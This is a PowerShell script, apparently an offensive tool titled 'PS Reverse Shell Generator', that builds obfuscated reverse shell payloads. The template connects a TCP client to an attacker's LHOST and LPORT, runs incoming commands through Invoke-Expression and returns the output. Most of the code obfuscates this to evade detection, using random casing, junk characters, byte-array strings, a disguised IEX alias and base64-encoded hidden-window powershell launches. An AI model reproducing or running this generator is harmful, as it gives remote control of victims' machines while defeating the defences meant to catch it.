$standard_shell_template = @'
TCPCLIENTVAR;CONNECTREMOTE;OBFUSCATED_IEX;NS_VAR = GETSTREAM;SINFOSTR = ('[' + WMISTROBF + '] > ');SINFO_VAR = [System.Text.Encoding]::UTF8.GetBytes(SINFOSTR);while (-not !(!(`$False))){NS_VAR.write(SINFO_VAR, 0, SINFO_VAR.Length);[byte[]]BF_VAR = 0..65535 | %{0};R_VAR = NS_VAR.Read(BF_VAR, 0, BF_VAR.length);NS_VAR.FLUSH();CM_VAR = [System.Text.Encoding]::UTF8OBF.GetString(BF_VAR);if (CM_VAR -eq (EXIT_VAR)){;NS_VAR.DISPOSE();VAR_NAME.Close();break};OUT_VAR = ((&IEX_VAR CM_VAR 2>&1| OUTSTRINGCMDLET) + NEWLINEVAR);BYTE_ARRAY = [System.Text.Encoding]::UTF8OBF.GetBytes(OUT_VAR);NS_VAR.Write(BYTE_ARRAY, 0, BYTE_ARRAY.length);NS_VAR.FLUSH()}
'@

Function Obfuscate-UTF8String{
    $utf8byte_array = ("UTF8".tochararray() | % {[byte][char]$_}) -join ","
    $final_utf8_string = "((($utf8byte_array) | % {[char]```$_}) -join '')"
    return $final_utf8_string
}

Function GRC-Cases { 
    [CmdLetBinding()]
    param([Parameter(Mandatory=$True)][String]$input_string)

    $string_len = $input_string.Length # Calculate the strings length
    $array_1 = $input_string.ToCharArray() # Convert the string into a character array and store them in two different arrays

    for($i=0; $i -lt $string_len; $i++) {
        $random_index = Get-Random -minimum 0 -maximum $string_len # Get a random index no. ranging between 0 to the (length of the string-1)
        $array_1[$random_index] = $array_1[$random_index].ToString().ToUpper() # convert the character present at the randomly generated index no. to uppercase and then store it in the second array
    }

    return $($array_1 -join "")
}

Function Get-RandomCI {
    [CmdLetBinding()]
    param([String]$string)
    $string_2 = @(0) * $string.Length #10
    $randomness_value = (Get-Random -minimum 1 -maximum $string.Length) # 5
    $charset = @("''", '""')
    $random_indices = ((1..($string.Length)) | get-random -count $randomness_value) # 3,6,5,1,7
    $string2 = $string.ToCharArray()
    for ($i = 0; $i -lt $string.Length; $i++) {
        $string_2[$i] = $string[$i]
    }

    for ($i = 0; $i -lt $randomness_value; $i++) {
        if ($random_indices[$i] -eq $string.Length) {
            continue
        }
        else {
            $string_2[$random_indices[$i]] = $string_2[$random_indices[$i]] + $($charset | Get-Random)
        }
    }

    return $($string_2 -join "")
}

Function Generate-JunkString{
    param($input_string)
    $string_len = $input_string.length
    $charset = @("@", "!", "%", "#")
    $junk_count = get-random -minimum 1 -maximum 3
    $rand_int = get-random -minimum 1 -maximum 3
    for ($i = 0; $i -lt $junk_count; $i++) {
        $junk_chars += get-random $charset
    }
    $junk_string = (($input_string[$string_len..0] -join "").tochararray() -join " ").Replace(" ", $junk_chars)

    if($rand_int -eq 1){
        $final_obfuscated_string = "(('$junk_string' -replace '$junk_chars', '')[$string_len..0] -join '')"
        return $final_obfuscated_string
    }
    else{
        $final_obfuscated_string = "((('$junk_string').replace('$junk_chars', ''))[$string_len..0] -join '')"
        return $final_obfuscated_string
    }

}

Function Obfuscate-TCPDispose{
    param($ns_var)
    $randomized_dispose_string = GRC-Cases "dispose"
    $reversed_rd_string = (($randomized_dispose_string[$randomized_dispose_string.length..0] -join '').tochararray() | % {[byte][char]$_}) -join ','
    $final_obfuscated_string = "((($reversed_rd_string) | % {[char]```$_})[7..0] -join '')"
    return $final_obfuscated_string
}

Function Obfuscate-TCPConnect{
    param($rev_var_name, $lhost_obfuscated, $lport)
    $get_rand = Get-Random -minimum 1 -maximum 3
    if ($get_rand -eq 1){
        $get_variable_obfuscated = Get-RandomCI (GRC-Cases "gv")
        $obfuscated_connect_method = Generate-JunkString (GRC-Cases "connect")
        $tcp_connect_obfuscated = "($get_variable_obfuscated $rev_var_name).$(GRC-Cases "value").$obfuscated_connect_method($lhost_obfuscated, $lport)"
        return $tcp_connect_obfuscated
    }
    else{
        $junk_connect_string = Generate-JunkString (GRC-Cases "connect")
        $tcp_connect_obfuscated = "```$$rev_var_name.$junk_connect_string($lhost_obfuscated, $lport)"
        return $tcp_connect_obfuscated
    }
}

Function Obfuscate-TCPFlush{
    $junk_flush_string = Generate-JunkString $(GRC-Cases "flush")
    return $junk_flush_string
}

Function Obfuscate-TCPObject{
    param($rev_var_name)
    $charset = @(":", "+", "-", "%", "*", "@", "[", "]","/", "^", "&")
    $rand_char = Get-Random $charset
    $rand_count = Get-Random -minimum 1 -maximum 3
    $generate_sysnetsock_str = ((GRC-Cases "system.net.sockets.tcpclient").tochararray() | % {[byte][char]$_}) -join " "
    $junkcharset_string = $generate_sysnetsock_str.Replace(" ", "$rand_char")
    if ($rand_count -eq 1) {
        $tcp_object_obfuscated = "```$$var_name_rev = $(Get-RandomCI (GRC-Cases 'New-Object')) ((('$junkcharset_string'.Replace('$rand_char', ',')).Split(',') | % {[char]([byte]```$_)}) -join '')"
        return $tcp_object_obfuscated
    }
    else{
        $byte_array_newobject = (((GRC-Cases "new-object").tochararray() | % {[byte][char]$_}) -join ',')
        $tcp_object_obfuscated = "```$$var_name_rev = &((($byte_array_newobject) | % {[char]```$_}) -join '') ((('$junkcharset_string'.Replace('$rand_char', ',')).Split(',') | % {[char]([byte]```$_)}) -join '')"
        return $tcp_object_obfuscated
    }
}

Function Obfuscate-TCPGetStream {
    param($rev_var_name)
    $get_stream_randomized = GRC-Cases "getstream"
    $get_stream_bytes = ($get_stream_randomized.ToCharArray() | % {[byte][char]$_}) -join ','
    $obfuscated_getstream = "((($get_stream_bytes) | % {[char]```$_}) -join '')()"
    $final_obfuscated_string = "```$$rev_var_name.$obfuscated_getstream"
    return $final_obfuscated_string
}
Function Obfuscate-AllTCPObjects{
    param($var_name_rev, $ns_var,$obfuscated_lhost, $lport)
    $tcp_object_obfuscated = Obfuscate-TCPObject $var_name_rev
    $tcp_connect_obfuscated = Obfuscate-TCPConnect $var_name_rev $obfuscated_lhost $lport
    $getstream_obfuscated = Obfuscate-TCPGetStream $var_name_rev
    $flush_obfuscated = Obfuscate-TCPFlush
    $dispose_obfuscated = Obfuscate-TCPDispose $ns_var
    return $tcp_connect_obfuscated, $tcp_object_obfuscated, $getstream_obfuscated, $flush_obfuscated, $dispose_obfuscated
}

Function Obfuscate-IEX{
    param($iex_var_name)
    $rand_count = Get-Random -minimum 1 -maximum 4
    if ($rand_count -eq 1){
        $obfuscated_iex_string = "```$$iex_var_name = ((gcm *k*) | % {if(```$_.name -match (('rPxE')[3..0] -join '')){```$_.name}})"
        return $obfuscated_iex_string
    }
    elseif ($rand_count -eq 2){
        $obfuscated_get_help = Get-RandomCI (GRC-Cases "get-help")
        $obfuscated_iex_string = "```$ProgressPreference='SilentlyContinue';  ```$$iex_var_name = (($obfuscated_get_help *-ex*n).name)"
        return $obfuscated_iex_string
    }
    else{
        $junk_iex_string = Generate-JunkString (GRC-Cases "iex")
        $obfuscated_iex_string = "```$$iex_var_name = $junk_iex_string"
        return $obfuscated_iex_string
    }
}

Function Get-RandomVariable{
    $byte = (65..90) + (97..122)
    $final = @()

    for ($i = 0; $i -lt 8; $i++) {
        $final += [char](get-random $byte)
    }
    return (($final -join ""))
}

Function Obfuscate-Host{
    param([String]$IPAddress)
    $final_bytes = @()
    $string_len = $IPAddress.length
    $rand = Get-Random -minimum 1 -maximum 3
    
    if ($rand -eq 1){
        $bytearray = $IPAddress.tochararray()
        foreach($byte in $bytearray){
            $final_bytes += [byte][char]$byte
        }
    
        $final = "(($($final_bytes -join ',')) | % {[char]```$_}) -join ''"
        return $final
    }

    else{
        $bytearray = ($IPAddress[$string_len..0] -join "").tochararray()
        foreach($byte in $bytearray){
            $final_bytes += [byte][char]$byte
        }
    
        $final = "((($($final_bytes -join ',')) | % {[char]```$_}) -join '')[$string_len..0] -join ''"
        return $final
    }
}


Function Initialize-Variables{
    param($lhost_to_obfuscate, $lport)
    $final_host = Obfuscate-Host $lhost_to_obfuscate
    $outstringcmdlet = (Get-RandomCI (GRC-Cases "Out-String"))
    $exit_var = ((Generate-JunkString (GRC-Cases "exit")) + " + " + (GRC-Cases "[System.Environment]::NewLine"))
    $iex_var = Get-RandomVariable; $rev_var = Get-RandomVariable; $ns_var = Get-RandomVariable; $bf_var = Get-RandomVariable; $cm_var = Get-RandomVariable; $r_var = Get-RandomVariable; $out_var = Get-RandomVariable; $byte_array = Get-RandomVariable; $sinfostr_var = Get-RandomVariable; $sinfo_var = Get-RandomVariable
    $obfuscated_iex_string = Obfuscate-IEX $iex_var
    $tcp_objects_obfuscated = Obfuscate-AllTCPObjects $rev_var $ns_var $final_host $lport
    $utf8_obfuscated_string = Obfuscate-UTF8String
    $obfuscated_wmi_object = "($(Get-RandomCI (GRC-Cases "get-wmiobject")) $(Generate-JunkString "win32_computersystem")).Name"
    $newlinevar = GRC-Cases "[system.environment]::newline"
    return $outstringcmdlet, $exit_var, $iex_var, $rev_var, $ns_var, $bf_var, $cm_var, $r_var, $out_var, $byte_array, $sinfostr_var, $sinfo_var, $obfuscated_iex_string, $tcp_objects_obfuscated, $utf8_obfuscated_string, $obfuscated_wmi_object, $newlinevar
    
}

Function Obfuscate-ParametersReverse{
    param($string_set)
    $reversed_value = ($string_set[$string_set.length..0] -join '')
    $final_parameter = "('$reversed_value'[$($string_set.Length)..0] -join '')"
    return $final_parameter
}

Function Initialize-FinalPayload{
    param($final_obfuscated_payload, [Switch]$B64Encode)
    if ($B64Encode){
        $argument_set = "-noni -win 1 -nop -e"
        $randomized_argument_set = GRC-Cases $argument_set 
        $final_payload_wp = "powershell $randomized_argument_set $final_obfuscated_payload"
        return $final_payload_wp
    }
    else{
        $argument_set = "-noni -win 1 -c"
        $randomized_argument_set = GRC-Cases $argument_set
        $final_payload_wp = ("powershell $randomized_argument_set" + ' "' + "$final_obfuscated_payload" + '"')
        return $final_payload_wp
    }
}

Function Out-Menu{
    param([String]$LHOST, [Int]$LPORT, [Switch]$B64Encode, [Switch]$Raw)
    $banner = @"
    ____  _____    ____                                   _____ __         ____
   / __ \/ ___/   / __ \___ _   _____  _____________     / ___// /_  ___  / / /
  / /_/ /\__ \   / /_/ / _ \ | / / _ \/ ___/ ___/ _ \    \__ \/ __ \/ _ \/ / / 
 / ____/___/ /  / _, _/  __/ |/ /  __/ /  (__  )  __/   ___/ / / / /  __/ / /  
/_/    /____/  /_/ |_|\___/|___/\___/_/  /____/\___/   /____/_/ /_/\___/_/_/   
                                                                               
   ______                           __            
  / ____/__  ____  ___  _________ _/ /_____  _____
 / / __/ _ \/ __ \/ _ \/ ___/ __ `/ __/ __ \/ ___/
/ /_/ /  __/ / / /  __/ /  / /_/ / /_/ /_/ / /    
\____/\___/_/ /_/\___/_/   \__,_/\__/\____/_/     

"@

    Write-Host $banner
    
    Write-Host -foreground red "[!] Successfully generated obfuscated reverse shell template!"
    if ($B64Encode){
        Write-Host -foreground red "[+] Payload type : " -nonewline
        Write-Host "Base64 Encoded (-e switch)`n"
    }
    elseif($Raw){
        Write-Host -foreground red "[+] Payload type : " -nonewline
        Write-Host "Raw PowerShell Code`n"
    }
    else{
        Write-Host -foreground red "[+] Payload type : " -nonewline
        Write-Host "Standard template (-c switch)`n"
    }
    Write-Host -foreground red "[+] LHOST : " -nonewline
    Write-Host $LHOST
    Write-Host -foreground red "[+] LPORT : " -nonewline
    Write-Host "$LPORT`n"
}

Function Invoke-DynamicRSH{
    param([Parameter(Mandatory=$True)][String]$LHOST, [Parameter(Mandatory=$True)][Int]$LPORT, [Switch]$B64Encode, [Switch]$Raw)
    if ($B64Encode){
        Out-Menu $LHOST $LPORT -B64Encode
    }
    elseif($Raw){
        Out-Menu $LHOST $LPORT -Raw
    }
    else{
        Out-Menu $LHOST $LPORT
    }
    
    $randomized_payload_template = GRC-Cases $standard_shell_template
    $obfuscated_tcp_objects = @()
    $final_outstringcmdlet, $exit_var_name, $iex_var_name, $rev_var_name, $ns_var_name, $bf_var_name, $cm_var_name, $r_var_name, $out_var_name, $byte_array_name, $sinfostr_var_name, $sinfo_var_name, $obfuscated_iex_string, $obfuscated_tcp_objects, $obfuscated_utf8, $obfuscated_wmi_object_string,$new_line_var_obf = Initialize-Variables $LHOST $LPORT

    $final_rshell =  ((($randomized_payload_template).Replace("OUTSTRINGCMDLET", $final_outstringcmdlet).Replace("VAR_NAME", $("``$" + $rev_var_name)).Replace("NS_VAR", $("``$" + $ns_var_name)).Replace("BF_VAR", $("``$" + $bf_var_name)).Replace("CM_VAR", $("``$" + $cm_var_name)).Replace("R_VAR", $("``$" + $r_var_name)).Replace("OUT_VAR", $("``$" + $out_var_name)).Replace("BYTE_ARRAY", $("``$" + $byte_array_name)).Replace("EXIT_VAR", $exit_var_name).Replace("IEX_VAR", $("``$" + $iex_var_name)).Replace("OBFUSCATED_IEX", $obfuscated_iex_string).Replace("CONNECTREMOTE", $obfuscated_tcp_objects[0])).Replace("TCPCLIENTVAR", $obfuscated_tcp_objects[1]).Replace("GETSTREAM",$obfuscated_tcp_objects[2]).Replace("FLUSH", $obfuscated_tcp_objects[3]).Replace("DISPOSE", $obfuscated_tcp_objects[4]).Replace("UTF8OBF", $obfuscated_utf8).Replace("SINFOSTR", $("``$" + $sinfostr_var_name)).Replace("SINFO_VAR", $("``$" + $sinfo_var_name)).Replace("WMISTROBF", $obfuscated_wmi_object_string).Replace("NEWLINEVAR", $new_line_var_obf))

    if ($B64Encode -and $Raw){
        throw "[!] -B64Encode and -Raw switch detected together! Please use one at a time!"
    }
    elseif ($B64Encode){
        $final_rshell_b64 = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(($final_rshell.Replace("``", ""))))
        $final_obfuscated_payload = Initialize-FinalPayload $final_rshell_b64 -B64Encode
        return $final_obfuscated_payload
    }
    elseif($Raw){
        return ($final_rshell.Replace("``", ""))
    }
    else{
        $final_obfuscated_payload = Initialize-FinalPayload $final_rshell
        return $final_obfuscated_payload
    }

}
